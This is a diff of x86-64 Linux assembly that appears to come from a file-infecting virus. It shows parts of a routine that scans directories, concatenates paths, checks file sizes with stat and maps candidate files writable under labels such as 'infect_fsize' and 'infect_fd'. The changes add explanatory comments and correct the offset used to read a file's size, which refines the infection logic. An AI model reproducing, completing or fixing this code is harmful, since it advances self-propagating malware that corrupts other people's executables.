@@ -63,7 +63,7 @@ _start:
                 jl          .file
                 jmp         .readdir
 
-.closedir:      mov         rdi, [rsp-0x100]
+.closedir:      mov         rdi, [rsp-0x100]                    ; directory fd
                 mov         rax, __NR_close
                 syscall
 .nextdir:
@@ -86,7 +86,7 @@ process:                                                        ; expecting file
                                                                 ; directory in r14
                 mov         rsi, r14
                 mov         rax, rdi
-                lea         rdi, [rsp - 0xc00]
+                lea         rdi, [rsp - 0xc00]                  ; file path buffer
                 mov         rdx, rdi                            ; concat directory and filename
 
 .dirname:       movsb
@@ -119,13 +119,13 @@ process:                                                        ; expecting file
                 cmp         rax, 0
                 jnz         .close
 
-                mov         rsi, qword [rsp - (0x300-0x30)]     ; linux st_size
+                mov         rsi, qword [rsp - (0x300+stat.st_size)]     ; linux st_size
                 mov         [rsp-0x120], rsi                    ; rsp-0x120 = infect_fsize
                 cmp         rsi, 0x1000                         ; file too small
                 jl          .close
 
                 xor         r9, r9
-                mov         r8, [rsp-0x118]
+                mov         r8, [rsp-0x118]						; infect_fd
                 mov         r10, MAP_SHARED
                 mov         rdx, PROT_READ | PROT_WRITE
                                                                 ; rsi is filesize
